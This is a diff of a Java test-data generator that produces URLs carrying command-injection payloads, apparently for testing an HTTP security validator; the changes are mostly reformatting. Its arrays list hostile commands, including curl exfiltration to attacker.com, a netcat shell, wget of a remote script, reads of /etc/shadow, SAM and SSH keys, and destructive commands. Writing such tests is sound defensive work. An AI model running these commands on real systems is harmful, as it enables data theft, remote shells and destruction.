@@ -17,9 +17,6 @@ package de.cuioss.tools.security.http.generators;
 
 import de.cuioss.test.generator.TypedGenerator;
 
-import java.util.ArrayList;
-import java.util.List;
-
 /**
  * T13: Command Injection Attack Generator
  * 
@@ -65,41 +62,41 @@ import java.util.List;
 public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private static final String[] BASE_URLS = {
-        "http://example.com/api/process",
-        "https://app.domain.com/execute", 
-        "http://localhost:8080/cmd",
-        "https://secure.site.org/system/run",
-        "http://test.example.com/admin/tools"
+            "http://example.com/api/process",
+            "https://app.domain.com/execute",
+            "http://localhost:8080/cmd",
+            "https://secure.site.org/system/run",
+            "http://test.example.com/admin/tools"
     };
 
     private static final String[] SHELL_OPERATORS = {
-        ";", "&&", "||", "|", "&", "\n", "\r\n"  
+            ";", "&&", "||", "|", "&", "\n", "\r\n"
     };
 
     private static final String[] UNIX_COMMANDS = {
-        "ls", "cat", "pwd", "whoami", "id", "ps", "netstat", 
-        "wget", "curl", "nc", "telnet", "ssh", "find", "grep"
+            "ls", "cat", "pwd", "whoami", "id", "ps", "netstat",
+            "wget", "curl", "nc", "telnet", "ssh", "find", "grep"
     };
 
     private static final String[] WINDOWS_COMMANDS = {
-        "dir", "type", "whoami", "net", "ipconfig", "tasklist",
-        "ping", "nslookup", "systeminfo", "wmic", "powershell"
+            "dir", "type", "whoami", "net", "ipconfig", "tasklist",
+            "ping", "nslookup", "systeminfo", "wmic", "powershell"
     };
 
     private static final String[] DANGEROUS_COMMANDS = {
-        "rm -rf", "del /f /q", "format", "fdisk", "dd", "mkfs",
-        "shutdown", "reboot", "halt", "init", "kill", "killall"
+            "rm -rf", "del /f /q", "format", "fdisk", "dd", "mkfs",
+            "shutdown", "reboot", "halt", "init", "kill", "killall"
     };
 
     private static final String[] FILE_OPERATIONS = {
-        "/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\config\\SAM",
-        "/proc/version", "/proc/cpuinfo", "C:\\boot.ini", "/var/log/auth.log"
+            "/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\config\\SAM",
+            "/proc/version", "/proc/cpuinfo", "C:\\boot.ini", "/var/log/auth.log"
     };
 
     @Override
     public String next() {
         String baseUrl = BASE_URLS[hashBasedSelection(BASE_URLS.length)];
-        
+
         return switch (hashBasedSelection(15)) {
             case 0 -> createShellCommandChaining(baseUrl);
             case 1 -> createWindowsCommandInjection(baseUrl);
@@ -129,13 +126,13 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createWindowsCommandInjection(String pattern) {
         String[] winCommands = {
-            "dir C:\\",
-            "type C:\\Windows\\System32\\config\\SAM",
-            "net user",
-            "ipconfig /all",
-            "tasklist /svc",
-            "wmic process list",
-            "powershell Get-Process"
+                "dir C:\\",
+                "type C:\\Windows\\System32\\config\\SAM",
+                "net user",
+                "ipconfig /all",
+                "tasklist /svc",
+                "wmic process list",
+                "powershell Get-Process"
         };
         String operator = "|";
         String command = winCommands[hashBasedSelection(winCommands.length)];
@@ -144,11 +141,11 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createPipedCommandInjection(String pattern) {
         String[] pipedCommands = {
-            "cat /etc/passwd | grep root",
-            "ps aux | grep ssh",
-            "netstat -an | grep LISTEN", 
-            "ls -la | wc -l",
-            "find / -name *.conf | head -10"
+                "cat /etc/passwd | grep root",
+                "ps aux | grep ssh",
+                "netstat -an | grep LISTEN",
+                "ls -la | wc -l",
+                "find / -name *.conf | head -10"
         };
         String command = pipedCommands[hashBasedSelection(pipedCommands.length)];
         return pattern + "?data=input; " + command;
@@ -156,11 +153,11 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createRedirectionAttack(String pattern) {
         String[] redirections = {
-            "ls -la > /tmp/output.txt",
-            "cat /etc/passwd >> /tmp/stolen.txt",
-            "whoami > /var/www/html/user.txt",
-            "ps aux > /tmp/processes.log",
-            "netstat -an 2>&1 > /tmp/network.txt"
+                "ls -la > /tmp/output.txt",
+                "cat /etc/passwd >> /tmp/stolen.txt",
+                "whoami > /var/www/html/user.txt",
+                "ps aux > /tmp/processes.log",
+                "netstat -an 2>&1 > /tmp/network.txt"
         };
         String command = redirections[hashBasedSelection(redirections.length)];
         return pattern + "?output=file.log && " + command;
@@ -168,11 +165,11 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createEnvironmentVariableInjection(String pattern) {
         String[] envCommands = {
-            "$PATH && cat /etc/passwd",
-            "$HOME; ls -la $HOME",
-            "$USER || whoami",
-            "echo $SHELL; cat /etc/shells",
-            "$PWD && find $PWD -name *.txt"
+                "$PATH && cat /etc/passwd",
+                "$HOME; ls -la $HOME",
+                "$USER || whoami",
+                "echo $SHELL; cat /etc/shells",
+                "$PWD && find $PWD -name *.txt"
         };
         String command = envCommands[hashBasedSelection(envCommands.length)];
         return pattern + "?env=" + command;
@@ -180,13 +177,13 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createSubshellCommandInjection(String pattern) {
         String[] subshellCommands = {
-            "$(whoami)",
-            "`cat /etc/passwd`",
-            "$(ls -la /)",
-            "`id -u`",
-            "$(find / -name passwd)",
-            "`ps aux | grep root`",
-            "$(netstat -an | wc -l)"
+                "$(whoami)",
+                "`cat /etc/passwd`",
+                "$(ls -la /)",
+                "`id -u`",
+                "$(find / -name passwd)",
+                "`ps aux | grep root`",
+                "$(netstat -an | wc -l)"
         };
         String command = subshellCommands[hashBasedSelection(subshellCommands.length)];
         return pattern + "?user=" + command;
@@ -194,11 +191,11 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createPathTraversalCommandInjection(String pattern) {
         String[] pathCommands = {
-            "../../../etc/passwd; cat /etc/passwd",
-            "..\\..\\..\\windows\\system32\\config\\sam && type sam",
-            "../../usr/bin/id; /usr/bin/id",
-            "../../../proc/version || cat /proc/version",
-            "..\\..\\boot.ini & type C:\\boot.ini"
+                "../../../etc/passwd; cat /etc/passwd",
+                "..\\..\\..\\windows\\system32\\config\\sam && type sam",
+                "../../usr/bin/id; /usr/bin/id",
+                "../../../proc/version || cat /proc/version",
+                "..\\..\\boot.ini & type C:\\boot.ini"
         };
         String command = pathCommands[hashBasedSelection(pathCommands.length)];
         return pattern + "?file=" + command;
@@ -206,12 +203,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createSleepBasedCommandInjection(String pattern) {
         String[] sleepCommands = {
-            "sleep 5",
-            "ping -c 5 127.0.0.1",
-            "timeout 5",
-            "powershell Start-Sleep 5",
-            "sleep 3 && whoami",
-            "ping -n 5 localhost"
+                "sleep 5",
+                "ping -c 5 127.0.0.1",
+                "timeout 5",
+                "powershell Start-Sleep 5",
+                "sleep 3 && whoami",
+                "ping -n 5 localhost"
         };
         String command = sleepCommands[hashBasedSelection(sleepCommands.length)];
         return pattern + "?timeout=1; " + command;
@@ -219,11 +216,11 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createErrorBasedCommandDetection(String pattern) {
         String[] errorCommands = {
-            "ls /nonexistent 2>&1",
-            "cat /root/.ssh/id_rsa 2>/dev/null",
-            "type C:\\nonexistent.txt 2>&1", 
-            "find / -name secret 2>/dev/null",
-            "grep -r password /etc/ 2>&1"
+                "ls /nonexistent 2>&1",
+                "cat /root/.ssh/id_rsa 2>/dev/null",
+                "type C:\\nonexistent.txt 2>&1",
+                "find / -name secret 2>/dev/null",
+                "grep -r password /etc/ 2>&1"
         };
         String command = errorCommands[hashBasedSelection(errorCommands.length)];
         return pattern + "?search=data || " + command;
@@ -231,12 +228,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createNetworkBasedCommandInjection(String pattern) {
         String[] networkCommands = {
-            "nslookup evil.com",
-            "wget http://attacker.com/shell.sh",
-            "curl -d @/etc/passwd http://attacker.com/exfil",
-            "nc -l -p 4444 -e /bin/sh",
-            "telnet attacker.com 4444",
-            "ping -c 1 attacker.com"
+                "nslookup evil.com",
+                "wget http://attacker.com/shell.sh",
+                "curl -d @/etc/passwd http://attacker.com/exfil",
+                "nc -l -p 4444 -e /bin/sh",
+                "telnet attacker.com 4444",
+                "ping -c 1 attacker.com"
         };
         String command = networkCommands[hashBasedSelection(networkCommands.length)];
         return pattern + "?host=localhost && " + command;
@@ -244,12 +241,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createFileSystemCommandAttack(String pattern) {
         String[] fileCommands = {
-            "touch /tmp/pwned.txt",
-            "mkdir /tmp/.hidden", 
-            "cp /etc/passwd /tmp/stolen.txt",
-            "mv /etc/hosts /tmp/hosts.bak",
-            "chmod 777 /etc/passwd",
-            "chown root:root /tmp/shell"
+                "touch /tmp/pwned.txt",
+                "mkdir /tmp/.hidden",
+                "cp /etc/passwd /tmp/stolen.txt",
+                "mv /etc/hosts /tmp/hosts.bak",
+                "chmod 777 /etc/passwd",
+                "chown root:root /tmp/shell"
         };
         String command = fileCommands[hashBasedSelection(fileCommands.length)];
         return pattern + "?action=create; " + command;
@@ -257,12 +254,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createProcessControlAttack(String pattern) {
         String[] processCommands = {
-            "kill -9 1",
-            "killall sshd",
-            "service apache2 stop", 
-            "/bin/sh -c 'exec /bin/bash'",
-            "nohup /bin/bash &",
-            "screen -dm bash"
+                "kill -9 1",
+                "killall sshd",
+                "service apache2 stop",
+                "/bin/sh -c 'exec /bin/bash'",
+                "nohup /bin/bash &",
+                "screen -dm bash"
         };
         String command = processCommands[hashBasedSelection(processCommands.length)];
         return pattern + "?pid=1234 || " + command;
@@ -270,12 +267,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createPrivilegeEscalationCommand(String pattern) {
         String[] escalationCommands = {
-            "sudo su -",
-            "su root",
-            "sudo /bin/bash",
-            "pkexec /bin/sh",
-            "/usr/bin/sudo whoami",
-            "doas sh"
+                "sudo su -",
+                "su root",
+                "sudo /bin/bash",
+                "pkexec /bin/sh",
+                "/usr/bin/sudo whoami",
+                "doas sh"
         };
         String command = escalationCommands[hashBasedSelection(escalationCommands.length)];
         return pattern + "?user=guest && " + command;
@@ -283,12 +280,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createDataExfiltrationCommand(String pattern) {
         String[] exfilCommands = {
-            "tar czf - /etc | base64",
-            "dd if=/dev/sda bs=512 count=1",
-            "cat /proc/meminfo | mail attacker@evil.com",
-            "grep -r password /var/log/",
-            "find /home -name '*.key' -exec cat {} \\;",
-            "lsof | grep deleted"
+                "tar czf - /etc | base64",
+                "dd if=/dev/sda bs=512 count=1",
+                "cat /proc/meminfo | mail attacker@evil.com",
+                "grep -r password /var/log/",
+                "find /home -name '*.key' -exec cat {} \\;",
+                "lsof | grep deleted"
         };
         String command = exfilCommands[hashBasedSelection(exfilCommands.length)];
         return pattern + "?backup=data; " + command;
@@ -296,12 +293,12 @@ public class CommandInjectionAttackGenerator implements TypedGenerator<String> {
 
     private String createMultiPlatformCommandVariant(String pattern) {
         String[] multiCommands = {
-            "uname -a || systeminfo",
-            "which bash || where cmd",
-            "cat /etc/issue || ver",
-            "ps -ef || tasklist",
-            "netstat -rn || route print",
-            "crontab -l || schtasks"
+                "uname -a || systeminfo",
+                "which bash || where cmd",
+                "cat /etc/issue || ver",
+                "ps -ef || tasklist",
+                "netstat -rn || route print",
+                "crontab -l || schtasks"
         };
         String command = multiCommands[hashBasedSelection(multiCommands.length)];
         return pattern + "?info=system && " + command;
